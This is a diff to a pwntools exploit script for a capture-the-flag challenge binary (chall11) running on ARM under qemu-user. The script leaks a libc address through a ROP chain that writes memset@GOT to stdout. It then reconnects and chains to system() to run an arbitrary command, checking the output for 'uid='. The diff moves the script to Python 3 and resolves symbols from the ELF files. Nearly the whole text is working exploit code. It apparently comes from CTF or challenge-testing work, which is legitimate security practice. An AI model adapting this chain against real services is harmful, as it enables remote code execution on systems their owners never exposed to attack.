@@ -5,18 +5,26 @@ import sys
 HOST = 'challenge.pwny.racing'
 PORT = 11535
 
-LIBC = 0x593f0
-SYST = 0x2d4cc
-CMD  = './flag_submitter test'
+CMD  = 'id'
+
+context(os='linux', arch='arm')
+
+target_elf = ELF('../bin/chall11')
 
 if len(sys.argv) > 1:
-    HOST  = sys.argv[1]
+	target_libc = ELF('../bin/libc.so.6')
+	HOST  = sys.argv[1]
+else:
+	target_libc = target_elf.libc
 
 if len(sys.argv) > 2:
     PORT = sys.argv[2]
 
 if len(sys.argv) > 3:
     CMD = sys.argv[3]
+
+SYST = target_libc.symbols['system'] # system() THUMB
+LIBC = target_libc.symbols['memset']
 
 # Note: This exploit will take advantage of the fact the vulnerable
 #       application is run in qemu-user, which has known limitations.
@@ -28,30 +36,30 @@ if len(sys.argv) > 3:
 
 # RUN 1: Leaking libc base address
 
-io = remote(HOST, PORT)
+io = remote(HOST, PORT, level='warn')
 
-print io.recvuntil('Sum')[:-10]
+sys.stdout.write(io.recvuntil('Sum')[:-10])
 io.recvline()
 
 # step 1: fill the buffer to eat up some stack
 for i in range(16):
-	io.recvuntil('<< ')
-	io.sendline('1')
+	io.recvuntil(b'<< ')
+	io.sendline(b'1')
 
 # step 2: overwrite the stack canary on the stack
-io.recvuntil('<< ')
-io.sendline('0')
+io.recvuntil(b'<< ')
+io.sendline(b'0')
 
 # step 3: write rop chain to bounce to trampoline where
 #         there is a gadget to populate registers
 rop = [
 	0x00000002,  # lr => junk
-	0x00022010,  # pc => .data trampoline
+	target_elf.bss(4),  # pc => .data trampoline
 
 	0x00000001,  # r0 => stdout
-	0x00021fec,  # r1 => memset@GOT
+	target_elf.symbols['got.memset'],  # r1 => memset@GOT
 	0x00000010,  # r2 => length
-	0x10624,     # pc => bl write()
+	0x10688,     # pc => bl write()
 
 ]
 
@@ -59,12 +67,12 @@ for addr in rop:
 	if addr > 0x7fffffff:
 		addr = 0-(0x100000000 - addr)
 
-	io.recvuntil('<< ')
-	io.sendline(str(addr))
+	io.recvuntil(b'<< ')
+	io.sendline(str(addr).encode('ascii'))
 
 # step 4: write trampoline gadget in .data
-io.recvuntil('<< ')
-io.sendline(p32(0xe8bd8007))  # pop {r0,r1,r2,pc}
+io.recvuntil(b'<< ')
+io.sendline(asm('pop {r0,r1,r2,pc}'))
 
 # step 5: close the write end of the socket to get EOF from read()
 #         which causes an out of bounds NULL write over the stack
@@ -72,51 +80,51 @@ io.sendline(p32(0xe8bd8007))  # pop {r0,r1,r2,pc}
 io.shutdown('send')
 
 # step 6: collect the leak
-io.recvuntil('<< ')
+io.recvuntil(b'<< ')
 leak = io.recvline().strip()[:4]
 leak = u32(leak)
 libc = leak - LIBC
 
-log.info('leak: 0x%08x' % leak)
-log.info('libc: 0x%08x' % libc)
+log.info('Leak: 0x%08x' % leak)
+log.info('Libc: 0x%08x' % libc)
 
 io.close()
 
 # RUN 2: Run arbitrary command
 
-io = remote(HOST, PORT)
+io = remote(HOST, PORT, level='warn')
 
-io.recvuntil('Sum')
+io.recvuntil(b'Sum')
 io.recvline()
 
 # step 1: fill the buffer to eat up some stack
 for i in range(16):
-	io.recvuntil('<< ')
-	io.sendline('1')
+	io.recvuntil(b'<< ')
+	io.sendline(b'1')
 
 # step 2: overwrite the stack canary on the stack
-io.recvuntil('<< ')
-io.sendline('0')
+io.recvuntil(b'<< ')
+io.sendline(b'0')
 
 # step 3: write rop chain
 rop = [
 	0x00000002,  # lr
-	0x00022010,  # pc => .data trampoline
+	target_elf.bss(4),  # pc => .data trampoline
 
-	0x00022014,   # r0 => command string
-	libc+SYST-1,  # pc => system()
+	target_elf.bss(12),   # r0 => command string
+	libc+SYST,  # pc => system()
 ]
 
 for addr in rop:
 	if addr > 0x7fffffff:
 		addr = 0-(0x100000000 - addr)
 
-	io.recvuntil('<< ')
+	io.recvuntil(b'<< ')
 	io.sendline(str(addr))
 
 # step 4: write trampoline gadget and command
-pay  = p32(0xe8bd8001)  # pop {r0,pc} 
-pay += CMD+'\n'
+pay  = asm('pop {r0,pc}')  # pop {r0,pc} 
+pay += (CMD+'\n').encode('ascii')
 
 io.recvuntil('<< ')
 io.sendline(pay)
@@ -127,8 +135,10 @@ io.sendline(pay)
 io.shutdown('send')
 
 # done
-io.recvuntil('<< ')
-out = io.recvuntil('/home/ctf/redir.sh:')[:-19].strip()
-print out
-
+id_result = io.recvall()
 io.close()
+
+if b'uid=' in id_result:
+	sys.exit(0)
+else:
+	sys.exit(1)
